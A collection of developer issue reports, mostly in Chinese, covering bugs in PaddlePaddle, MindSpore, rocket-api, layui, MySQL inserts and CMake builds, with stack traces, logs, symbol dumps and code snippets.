【众智】【计算-AICPU开发】AdaptiveAvgPool2d,"AICPU算子开发 在由多个输入平面组成的输入信号上应用 2D 自适应平均池化 Python层接口 （ 反向与库上接口冲突，故改名为V1版 ） 接口目录：mindspore/ops/operations/nn_ops.py output_size ListInt 属性 x y 对应底层算子 对应底层AI CPU算子AdaptiveAvgPool2d Classify Name Type Type Range Required Format INPUT x fp16, fp32 TRUE OUTPUT y fp16, fp32 TRUE REQUIRED_ATTR output_size ListInt TRUE 标杆接口参考 PyTorch接口： https://pytorch.org/docs/stable/generated/torch.nn.functional.adaptive_avg_pool2d 3. 异常处理 4. 算子反向 参考PyTorch反向函数adaptive_avg_pool2d_backward_cpu pytorch\aten\src\ATen\native\AdaptiveAveragePooling.cpp adaptive_avg_pool2d_backward_cpu   <code>: class AdaptiveAvgPool2DV1(Primitive):"
页面渲染问题,"当我使用iframe时如果tabs页面引用了 并且tabs引用的页面把body等标签删除后再次引用 后点击重复引用的tab页再次点击第一个tab页面就会出现问题   <code>: &lt;th:block th:include=""include :: footer"" /&gt; &lt;th:block th:include=""include :: footer"" /&gt;"
dataprovider.py 对象报错,"我在dataprovider.py中增加了一个类, 运行中报错 错误为 调用函数: 如果import或在函数中import错误依然存在，如下 单独执行脚本成功但用paddle执行不行，是否还需要对修饰器进行修改呢？ 问题更新： 尝试class不能在process外部定义，但变量可以。有解决方案么？ I've got a problem when got no error only execute that file but occurs the error above. The error message is as above. Thanks!   <code>: Fold Python Error: &lt;type 'exceptions.AttributeError'&gt; : 'module' object has no attribute 'Fold' @provider( init_hook=initHook, cache=CacheType.CACHE_PASS_IN_MEM, should_shuffle=False) # Shuffled in invoker def process(settings, file_name): with open(file_name) as f: f.seek(0) cv = pickle.load(f) f.close() from runs import Fold @provider( init_hook=initHook, cache=CacheType.CACHE_PASS_IN_MEM, should_shuffle=False) # Shuffled in invoker def process(settings, file_name): with open(file_name) as f: f.seek(0) cv = pickle.load(f) f.close() @provider( init_hook=initHook, cache=CacheType.CACHE_PASS_IN_MEM, should_shuffle=False) # Shuffled in invoker def process(settings, file_name): from runs import Fold with open(file_name) as f: f.seek(0) cv = pickle.load(f) f.close() .py"
null值加datetime无法插入数据库,"问题很难描述清楚，大致就是，在mysql5.7中当数据表中有一个字段是datetime类型并且有一个其他数据类型（目前测试过的有varchar、int、float）。当insert时，其他字段中有null值，datetime有值时，错误信息如下 ![ 建表语句如下： 流程图如下：   <code>: SET NAMES utf8mb4; SET FOREIGN_KEY_CHECKS = 0; DROP TABLE IF EXISTS `test03`; CREATE TABLE `test03` ( `id` int(11) NOT NULL AUTO_INCREMENT, `test` varchar(11) CHARACTER SET latin1 COLLATE latin1_swedish_ci DEFAULT NULL, `datatime` datetime(0) DEFAULT NULL, PRIMARY KEY (`id`) USING BTREE ) ENGINE = InnoDB AUTO_INCREMENT = 13 CHARACTER SET = latin1 COLLATE = latin1_swedish_ci ROW_FORMAT = Dynamic; INSERT INTO `test03` VALUES (1, NULL, '2019-09-29 22:44:19'); SET FOREIGN_KEY_CHECKS = 1; &lt;mxGraphModel&gt; &lt;root&gt; &lt;mxCell id=""0""&gt; &lt;JsonProperty as=""data""&gt; {&amp;quot;spiderName&amp;quot;:&amp;quot;null值加datetime测试&amp;quot;,&amp;quot;threadCount&amp;quot;:&amp;quot;1&amp;quot;} &lt;/JsonProperty&gt; &lt;/mxCell&gt; &lt;mxCell id=""1"" parent=""0""/&gt; &lt;mxCell id=""2"" value=""开始"" style=""start"" vertex=""1"" parent=""1""&gt; &lt;mxGeometry x=""80"" y=""80"" width=""32"" height=""32"" as=""geometry""/&gt; &lt;JsonProperty as=""data""&gt; {&amp;quot;shape&amp;quot;:&amp;quot;start&amp;quot;} &lt;/JsonProperty&gt; &lt;/mxCell&gt; &lt;mxCell id=""3"" value=""执行SQL"" style=""executeSql"" vertex=""1"" parent=""1""&gt; &lt;mxGeometry x=""180"" y=""80"" width=""32"" height=""32"" as=""geometry""/&gt; &lt;JsonProperty as=""data""&gt; {&amp;quot;value&amp;quot;:&amp;quot;执行SQL&amp;quot;,&amp;quot;datasourceId&amp;quot;:&amp;quot;392627c5a171844a7a3e141e3db274f3&amp;quot;,&amp;quot;statementType&amp;quot;:&amp;quot;select&amp;quot;,&amp;quot;sql&amp;quot;:&amp;quot;select * from test03 where id = 1&amp;quot;,&amp;quot;shape&amp;quot;:&amp;quot;executeSql&amp;quot;} &lt;/JsonProperty&gt; &lt;/mxCell&gt; &lt;mxCell id=""4"" value="""" edge=""1"" parent=""1"" source=""2"" target=""3""&gt; &lt;mxGeometry relative=""1"" as=""geometry""/&gt; &lt;JsonProperty as=""data""&gt; {&amp;quot;value&amp;quot;:&amp;quot;&amp;quot;,&amp;quot;condition&amp;quot;:&amp;quot;&amp;quot;} &lt;/JsonProperty&gt; &lt;/mxCell&gt; &lt;mxCell id=""5"" value=""定义变量"" style=""variable"" vertex=""1"" parent=""1""&gt; &lt;mxGeometry x=""280"" y=""80"" width=""32"" height=""32"" as=""geometry""/&gt; &lt;JsonProperty as=""data""&gt; {&amp;quot;value&amp;quot;:&amp;quot;定义变量&amp;quot;,&amp;quot;loopVariableName&amp;quot;:&amp;quot;i&amp;quot;,&amp;quot;loopCount&amp;quot;:&amp;quot;${rs.size()}&amp;quot;,&amp;quot;shape&amp;quot;:&amp;quot;variable&amp;quot;} &lt;/JsonProperty&gt; &lt;/mxCell&gt; &lt;mxCell id=""6"" value="""" edge=""1"" parent=""1"" source=""3"" target=""5""&gt; &lt;mxGeometry relative=""1"" as=""geometry""/&gt; &lt;JsonProperty as=""data""&gt; {&amp;quot;value&amp;quot;:&amp;quot;&amp;quot;,&amp;quot;condition&amp;quot;:&amp;quot;&amp;quot;} &lt;/JsonProperty&gt; &lt;/mxCell&gt; &lt;mxCell id=""7"" value=""执行SQL"" style=""executeSql"" vertex=""1"" parent=""1""&gt; &lt;mxGeometry x=""390"" y=""80"" width=""32"" height=""32"" as=""geometry""/&gt; &lt;JsonProperty as=""data""&gt; {&amp;quot;value&amp;quot;:&amp;quot;执行SQL&amp;quot;,&amp;quot;datasourceId&amp;quot;:&amp;quot;392627c5a171844a7a3e141e3db274f3&amp;quot;,&amp;quot;statementType&amp;quot;:&amp;quot;insert&amp;quot;,&amp;quot;sql&amp;quot;:&amp;quot;insert into test03(test,datatime) values(#${rs[i].test}#,#${rs[i].datatime}#)&amp;quot;,&amp;quot;shape&amp;quot;:&amp;quot;executeSql&amp;quot;} &lt;/JsonProperty&gt; &lt;/mxCell&gt; &lt;mxCell id=""8"" value="""" edge=""1"" parent=""1"" source=""5"" target=""7""&gt; &lt;mxGeometry relative=""1"" as=""geometry""/&gt; &lt;JsonProperty as=""data""&gt; {&amp;quot;value&amp;quot;:&amp;quot;&amp;quot;,&amp;quot;condition&amp;quot;:&amp;quot;&amp;quot;} &lt;/JsonProperty&gt; &lt;/mxCell&gt; &lt;/root&gt; &lt;/mxGraphModel&gt;"
hide symbols in `paddle_inference_api.so`,something like this:   <code>: 3087: 0000000000000000 0 OBJECT GLOBAL DEFAULT UND _ZTISt16invalid_argument@ 3092: 0000000000000000 0 FUNC GLOBAL DEFAULT UND _ZNSt9basic_iosIcSt11char 3093: 000000000008ae00 1551 FUNC GLOBAL DEFAULT 12 _ZN6google9SendEmailEPKcS 3100: 0000000000000000 0 FUNC GLOBAL DEFAULT UND _ZNSs6appendERKSs@@GLIBCX 3104: 0000000000000000 0 NOTYPE GLOBAL DEFAULT UND _ZN6paddle9framework9make 3109: 0000000000089290 163 FUNC GLOBAL DEFAULT 12 _ZN6google16posix_strerro 3114: 000000000008f420 12 FUNC GLOBAL DEFAULT 12 _ZN6google24glog_internal 3119: 0000000000000000 0 FUNC GLOBAL DEFAULT UND open@@GLIBC_2.2.5 3129: 0000000000099c30 8 FUNC GLOBAL DEFAULT 12 _ZN6google13VersionString 3130: 0000000000000000 0 OBJECT GLOBAL DEFAULT UND _ZTIl@@CXXABI_1.3 3135: 00000000002e03c0 1 OBJECT GLOBAL DEFAULT 26 _ZN3fLB15FLAGS_noversionE 3152: 000000000008c300 228 FUNC GLOBAL DEFAULT 12 _ZN6google26GetExistingTe 3157: 00000000002cfd28 8 OBJECT GLOBAL DEFAULT 26 _ZN6google14LogDestinatio 3178: 0000000000000000 0 FUNC GLOBAL DEFAULT UND strtod@@GLIBC_2.2.5 3182: 0000000000000000 0 OBJECT GLOBAL DEFAULT UND stdout@@GLIBC_2.2.5 3187: 000000000008b460 142 FUNC GLOBAL DEFAULT 12 _ZN6googlelsERSoRKNS_15PR 3195: 0000000000000000 0 FUNC GLOBAL DEFAULT UND time@@GLIBC_2.2.5 3198: 000000000009bb20 5 FUNC GLOBAL DEFAULT 12 _ZN6google21RegisterFlagV 3200: 000000000005ec30 0 FUNC GLOBAL DEFAULT 9 _init 3203: 0000000000000000 0 FUNC GLOBAL DEFAULT UND _ZNSt15basic_streambufIcS 3205: 0000000000000000 0 FUNC GLOBAL DEFAULT UND fflush@@GLIBC_2.2.5 3206: 00000000000a0e20 13 FUNC GLOBAL DEFAULT 12 _ZN6google21ParseCommandL 3213: 000000000008f4d0 47 FUNC GLOBAL DEFAULT 12 _ZN6google24glog_internal 3214: 00000000002cfc60 4 OBJECT GLOBAL DEFAULT 25 _ZN3fLI28FLAGS_tab_comple
特殊参数名称时值获取不到问题,"问题：参数名称为content时获取不到参数值 版本：2.3.7.RELEASE 背景：使用rocket-api自带的postman请求，参数为content时候报错 返回值 可能原因： 复现： 已经在issue里面搜索过没有类似问题   <code>: java.lang.ArrayIndexOutOfBoundsException: 1 at com.github.alenfive.rocketapi.service.ScriptParseService.buildValueOfScriptContent(ScriptParseService.java:289) at com.github.alenfive.rocketapi.service.ScriptParseService.buildParamItem(ScriptParseService.java:255) at com.github.alenfive.rocketapi.function.UtilsFunction.val(UtilsFunction.java:63) at com.github.alenfive.rocketapi.function.UtilsFunction$val.call(Unknown Source) at org.codehaus.groovy.runtime.callsite.CallSiteArray.defaultCall(CallSiteArray.java:47) at org.codehaus.groovy.runtime.callsite.AbstractCallSite.call(AbstractCallSite.java:125) at org.codehaus.groovy.runtime.callsite.AbstractCallSite.call(AbstractCallSite.java:139) at Script1.run(Script1.groovy:2) at org.codehaus.groovy.jsr223.GroovyScriptEngineImpl.eval(GroovyScriptEngineImpl.java:317) at org.codehaus.groovy.jsr223.GroovyScriptEngineImpl.eval(GroovyScriptEngineImpl.java:155) at javax.script.AbstractScriptEngine.eval(AbstractScriptEngine.java:233) at com.github.alenfive.rocketapi.script.GroovyScriptParse.engineEval(GroovyScriptParse.java:97) at com.github.alenfive.rocketapi.script.GroovyScriptParse.runScript(GroovyScriptParse.java:82) at com.github.alenfive.rocketapi.script.GroovyScriptParse$$FastClassBySpringCGLIB$$ab5f1f89.invoke(&lt;generated&gt;) at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:218) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.invokeJoinpoint(CglibAopProxy.java:746) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:163) at org.springframework.transaction.interceptor.TransactionAspectSupport.invokeWithinTransaction(TransactionAspectSupport.java:294) at org.springframework.transaction.interceptor.TransactionInterceptor.invoke(TransactionInterceptor.java:98) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:688) at com.github.alenfive.rocketapi.script.GroovyScriptParse$$EnhancerBySpringCGLIB$$a3d06254.runScript(&lt;generated&gt;) at com.github.alenfive.rocketapi.controller.ApiController.runScript(ApiController.java:316) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:215) at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:142) at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:102) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:895) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:800) at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87) at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1038) at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:942) at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:998) at org.springframework.web.servlet.FrameworkServlet.doPost(FrameworkServlet.java:901) at javax.servlet.http.HttpServlet.service(HttpServlet.java:660) at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:875) at javax.servlet.http.HttpServlet.service(HttpServlet.java:741) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:231) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:53) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.web.filter.CorsFilter.doFilterInternal(CorsFilter.java:96) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:99) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:92) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.web.filter.HiddenHttpMethodFilter.doFilterInternal(HiddenHttpMethodFilter.java:93) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:200) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:199) at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:96) at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:490) at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:139) at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92) at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:74) at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:343) at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:408) at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:66) at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:770) at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1415) at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617) at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) at java.lang.Thread.run(Thread.java:748) 1 -------------- There is no return value { ""code"": ""500"", ""msg"": ""1"", ""data"": null } if (scopeSet.contains(paramArr[0])){ switch (ParamScope.valueOf(paramArr[0])){ case content:value = buildValueOfScriptContent(apiInfoContent.getEngineBindings() == null?null:apiInfoContent.getEngineBindings(),paramArr,1);break; case pathVar:value = buildValueOfPathVar(apiParams.getPathVar(),paramArr[1]);break; case param:value = buildValueOfParameter(apiParams.getParam(),paramArr,1);break; case body:value = buildValueOfBody(apiParams.getBody(),paramArr,1);break; case cookie:value = buildValueOfCookie(apiParams.getCookie(),apiParams.getRequest(),paramArr,1);break; case header:value = buildValueOfHeader(apiParams.getHeader(),paramArr,1);break; case session:value = buildValueOfSession(apiParams.getSession(),paramArr,1);break; } //参数content content = Utils.val(""content"") log.info(""参数：{}"",content)"
executor and parallel executor do not return the same type of fetch_list,"When I run the train with , I get the loss: But when I run the train with , I get the loss: I think we should make the result of are same.   <code>: executor loss: [0.51612484], type: &lt;type 'numpy.ndarray'&gt; parallel executor loss: &lt;paddle.fluid.core.LoDTensor object at 0x7f05d6a659f0&gt;, type: &lt;class 'paddle.fluid.core.LoDTensor'&gt; executor.run()"
数据表格中input、select、button等控件的问题,"贤心大神你好，如下图，我在数据表格中需要加入select、input等，但发现显示效果不佳，也设置了align:""center""，左右是居中了，但是上下出了点问题，底部被遮住了，如下图。select还有个问题，就是点击下拉时，看不到下拉的内容（应该被遮住了），请问应该如何处理呢，感谢贤心大神。   <code>: &lt;div class=""layuimini-container layuimini-page-anim""&gt; &lt;div&gt;任务管理页&lt;/div&gt; &lt;div class=""layuimini-main""&gt; &lt;div class=""layui-btn-group demoTable""&gt; &lt;!-- &lt;button class=""layui-btn"" data-type=""getCheckData""&gt;获取选中行数据&lt;/button&gt;--&gt; &lt;button class=""layui-btn"" data-type=""openWS""&gt;打开WS&lt;/button&gt; &lt;button class=""layui-btn"" data-type=""sendTest""&gt;数据发送测试&lt;/button&gt; &lt;/div&gt; &lt;table class=""layui-hide"" id=""dev-list"" lay-filter=""dev""&gt;&lt;/table&gt; &lt;script type=""text/html"" id=""dev_l""&gt; &lt;input type=""checkbox"" name=""sex"" value=""{{d.dev_id}}"" lay-skin=""switch"" lay-text=""开|关"" lay-filter=""dev_l""&gt; &lt;/script&gt; &lt;script type=""text/html"" id=""dev_lts""&gt; &lt;input type=""checkbox"" name=""sex"" value=""{{d.dev_id}}"" lay-skin=""switch"" lay-text=""开|关"" lay-filter=""dev_lts""&gt; &lt;/script&gt; &lt;script type=""text/html"" id=""dev_led""&gt; &lt;input type=""text"" name=""title"" required lay-verify=""required"" value=""50"" autocomplete=""off"" class=""layui-input"" &gt; &lt;/script&gt; &lt;script type=""text/html"" id=""dev_lt""&gt; &lt;select name=""city"" lay-verify="""" lay-event=""dev_lt""&gt; &lt;option value=""""&gt;请选择&lt;/option&gt; &lt;option value=""010""&gt;北京&lt;/option&gt; &lt;option value=""021""&gt;上海&lt;/option&gt; &lt;option value=""0571""&gt;杭州&lt;/option&gt; &lt;/select&gt; &lt;/script&gt; &lt;script type=""text/html"" id=""dev_lt_work""&gt; &lt;input type=""text"" lay-skin=""primary"" class=""layui-input"" placeholder=""HH:mm:ss"" value=""02:15:45"" lay-event=""time_select""&gt; &lt;/script&gt; &lt;/div&gt; &lt;/div&gt; &lt;script&gt; layui.use(['table', 'laydate'], function(){ var table = layui.table ,form = layui.form ,laydate = layui.laydate; table.render({ elem: '#dev-list' ,url:'../api/test1.json' ,cellMinWidth: 80 ,cols: [[ {type:'numbers'} ,{type: 'checkbox'} ,{field:'dev_id', title:'设备号', width:100, unresize: true, sort: true,align:""center""} ,{field:'dev_l', title:'通道开关', width:100, templet: '#dev_l', unresize: true,align:""center""} ,{field:'dev_lts', title:'定时开关', width:100, templet: '#dev_lts', unresize: true,align:""center""} ,{field:'dev_led', title:'LED', width:100, templet: '#dev_led', unresize: true,align:""center""} ,{field:'dev_lt', title:'定时参数', width:150, templet: '#dev_lt', unresize: true,align:""center""} ,{field:'dev_lt_work', title: '定时设定', width:110, templet: '#dev_lt_work', unresize: true,align:""center""} ,{field:'dev_work', title: '设备操作', minWidth:120} ]] ,page: true ,done: function(res, curr, count){ //如果是异步请求数据方式，res即为你接口返回的信息。 //如果是直接赋值的方式，res即为：{data: [], count: 99} data为当前页数据、count为数据总长度 console.log(res); //得到当前页码 console.log(curr); //得到数据总量 console.log(count); } }); //监听控制 form.on('switch(dev_l)', function(obj){ // layer.tips(this.value + ' ' + this.name + '：'+ obj.elem.checked, obj.othis); console.log(obj); console.log(this.name); console.log(obj.elem.checked); }); //监听定时开关 form.on('switch(dev_lts)', function(obj){ // layer.tips(this.value + ' ' + this.name + '：'+ obj.elem.checked, obj.othis); console.log(obj); console.log(this.name); console.log(obj.elem.checked); }); //监听工具条 table.on('tool(dev)', function(obj){ if(obj.event=='time_select'){ console.log(obj); //时间选择器 laydate.render({ elem: this ,type: 'time' , show: true //直接显示---千万要加这个 }); } }); }); &lt;/script&gt;"
Building Paddle in Debug mode fails,"System information -PaddlePaddle version: current develop branch -CPU: including CPUMKL/OpenBlas/MKLDNN version -OS Platform and Distribution: Ubuntu 18.04 -Python version: 2.7.17 To Reproduce Build Paddle with cmake command containing the option , e.g. When building Padle in debug mode the issue https://github.com/PaddlePaddle/Paddle/issues/25494 is present. However, even after commenting out the offending code in the file the following building error occurs: Both building issues are inhibitive when fixing issues and feature development.   <code>: -DCMAKE_BUILD_TYPE=Debug cmake -DWITH_GPU=OFF -DWITH_DISTRIBUTE=OFF -DWITH_MKLDNN=ON -DWITH_PROFILER=ON -DON_INFER=ON -DCMAKE_BUILD_TYPE=Debug -DWITH_TESTING=ON -DWITH_INFERENCE_API_TEST=ON -DWITH_NCCL=OFF .. tinyformat.h [100%] Built target check_symbol Traceback (most recent call last): File ""setup.py"", line 506, in &lt;module&gt; 'fleetrun = paddle.distributed.fleet.launch:launch' File ""/usr/lib/python2.7/dist-packages/setuptools/__init__.py"", line 129, in setup return distutils.core.setup(**attrs) File ""/usr/lib/python2.7/distutils/core.py"", line 151, in setup dist.run_commands() File ""/usr/lib/python2.7/distutils/dist.py"", line 953, in run_commands self.run_command(cmd) File ""/usr/lib/python2.7/distutils/dist.py"", line 972, in run_command cmd_obj.run() File ""/usr/lib/python2.7/dist-packages/wheel/bdist_wheel.py"", line 266, in run wheel_name = archive_wheelfile(pseudoinstall_root, archive_root) File ""/usr/lib/python2.7/dist-packages/wheel/archive.py"", line 20, in archive_wheelfile return make_wheelfile_inner(base_name) File ""/usr/lib/python2.7/dist-packages/wheel/archive.py"", line 72, in make_wheelfile_inner writefile(path, date_time) File ""/usr/lib/python2.7/dist-packages/wheel/archive.py"", line 58, in writefile zip.writestr(zinfo, fp.read()) File ""/usr/lib/python2.7/zipfile.py"", line 1257, in writestr self._writecheck(zinfo) File ""/usr/lib/python2.7/zipfile.py"", line 1137, in _writecheck "" would require ZIP64 extensions"") zipfile.LargeZipFile: Filesize would require ZIP64 extensions python/CMakeFiles/paddle_python.dir/build.make:1475: recipe for target 'python/build/.timestamp' failed make[2]: *** [python/build/.timestamp] Error 1 CMakeFiles/Makefile2:128658: recipe for target 'python/CMakeFiles/paddle_python.dir/all' failed make[1]: *** [python/CMakeFiles/paddle_python.dir/all] Error 2 make[1]: *** Waiting for unfinished jobs.... [100%] Built target inference_lib_dist Makefile:160: recipe for target 'all' failed make: *** [all] Error 2"
Bugfix in finding python,"PR for issue https://github.com/baidu/Paddle/issues/297 the issue that find_package(PythonLibs 2.7 REQUIRED) and find_package(PythonInterp 2.7 REQUIRED) could find different python is BUG in CMAKE, instead of PaddlePaddle. Related BUGs: But, the solution is not clear. Solution I prefer: Set CMake min version to 3.2 in CMakeList.txt use CMAKE_PREFIX_PATH= to restrict python selection in external compiling script, instead of hacking CMakeList.txt @emailweixu if you feel free, can verify the following solution in your test environment. How about your suggestions. @reyoung @emailweixu @王小花不瞎搞   <code>: http://public.kitware.com/pipermail/cmake/2015-December/062387.html https://cmake.org/Bug/view.php?id=14809 https://cmake.org/Bug/view.php?id=13794 https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=677598 https://github.com/Valloric/YouCompleteMe/issues/1307 cmake_minimum_required(VERSION 3.2) cmake_minimum_required(VERSION 3.2)"
SwinTransformer version1 on GPU: overflow,"//kind/bug 环境： Python 3.7.5 MindSpore version: 1.9.0 Cuda compilation tools, release 11.1, V11.1.74 Build cuda_11.1.TC455_06.29069683_0 8 * 3090 dataset: ImageNet1K 运行命令： bash ./scripts/run_distribute_train_gpu.sh /absolute/path/swin_tiny_patch4_window7_224.yaml 8 0,1,2,3,4,5,6,7 运行结果 See as 2 above. 【Existing Issues】/【存在的问题】 Overflow during training. 但是网络一直处于训练状态。 【Expected Result】【预期结果】 Without overflow.   <code>: =============Over Flow, skipping============= =============Over Flow, skipping============= =============Over Flow, skipping============= =============Over Flow, skipping============= =============Over Flow, skipping============= =============Over Flow, skipping============= =============Over Flow, skipping============= =============Over Flow, skipping============= =============Over Flow, skipping============= epoch: 1 step: 1251, loss is 6.766918659210205 Train epoch time: 4091870.074 ms, per step time: 3270.879 ms epoch: 1 step: 1251, loss is 6.520120620727539 Train epoch time: 4091930.086 ms, per step time: 3270.927 ms epoch: 1 step: 1251, loss is 6.807669639587402 Train epoch time: 4091892.985 ms, per step time: 3270.898 ms epoch: 1 step: 1251, loss is 6.780869483947754 Train epoch time: 4092197.387 ms, per step time: 3271.141 ms epoch: 1 step: 1251, loss is 6.508459091186523 Train epoch time: 4092502.977 ms, per step time: 3271.385 ms epoch: 1 step: 1251, loss is 6.70298957824707 Train epoch time: 4092509.700 ms, per step time: 3271.391 ms epoch: 1 step: 1251, loss is 6.6978654861450195 Train epoch time: 4092531.667 ms, per step time: 3271.408 ms epoch: 1 step: 1251, loss is 6.5920491218566895 Train epoch time: 4092609.147 ms, per step time: 3271.470 ms [WARNING] MD(46005,7f227921d740,python):2022-11-24-05:13:45.107.231 [mindspore/ccsrc/minddata/dataset/util/task.cc:163] Join] ImageFolderOp::WorkerEntry Thread ID 139744210056960 is not responding. Interrupt again [WARNING] MD(46008,7f3293b59740,python):2022-11-24-05:13:45.107.903 [mindspore/ccsrc/minddata/dataset/util/task.cc:163] Join] ImageFolderOp::WorkerEntry Thread ID 139819954427648 is not responding. Interrupt again [WARNING] MD(46011,7f663b045740,python):2022-11-24-05:13:45.119.059 [mindspore/ccsrc/minddata/dataset/util/task.cc:163] Join] ImageFolderOp::WorkerEntry Thread ID 140026335721216 is not responding. Interrupt again [WARNING] MD(46010,7f1bfeeac740,python):2022-11-24-05:13:45.216.879 [mindspore/ccsrc/minddata/dataset/util/task.cc:163] Join] ImageFolderOp::WorkerEntry Thread ID 139739126535936 is not responding. Interrupt again [WARNING] MD(46007,7ffa965fa740,python):2022-11-24-05:13:45.280.583 [mindspore/ccsrc/minddata/dataset/util/task.cc:163] Join] ImageFolderOp::WorkerEntry Thread ID 140663953790720 is not responding. Interrupt again [WARNING] MD(46012,7f6c90fea740,python):2022-11-24-05:13:45.288.774 [mindspore/ccsrc/minddata/dataset/util/task.cc:163] Join] ImageFolderOp::WorkerEntry Thread ID 140061534304000 is not responding. Interrupt again [WARNING] MD(46006,7f2abfb93740,python):2022-11-24-05:13:45.297.189 [mindspore/ccsrc/minddata/dataset/util/task.cc:163] Join] ImageFolderOp::WorkerEntry Thread ID 139786198669056 is not responding. Interrupt again [WARNING] MD(46009,7f6c8dde0740,python):2022-11-24-05:13:45.298.019 [mindspore/ccsrc/minddata/dataset/util/task.cc:163] Join] ImageFolderOp::WorkerEntry Thread ID 140059848189696 is not responding. Interrupt again epoch: 1 acc: 0.028705929487179486, best acc is 0.028705929487179486 epoch: 1 acc: 0.028705929487179486, best acc is 0.028705929487179486 epoch: 1 acc: 0.028725961538461537, best acc is 0.028725961538461537 epoch: 1 acc: 0.028705929487179486, best acc is 0.028705929487179486 epoch: 1 acc: 0.028705929487179486, best acc is 0.028705929487179486 epoch: 1 acc: 0.02876602564102564, best acc is 0.02876602564102564 epoch: 1 acc: 0.028725961538461537, best acc is 0.028725961538461537 epoch: 1 acc: 0.028705929487179486, best acc is 0.028705929487179486 =============Over Flow, skipping============= =============Over Flow, skipping============= =============Over Flow, skipping============= =============Over Flow, skipping============= =============Over Flow, skipping============= =============Over Flow, skipping============= =============Over Flow, skipping============= =============Over Flow, skipping============="
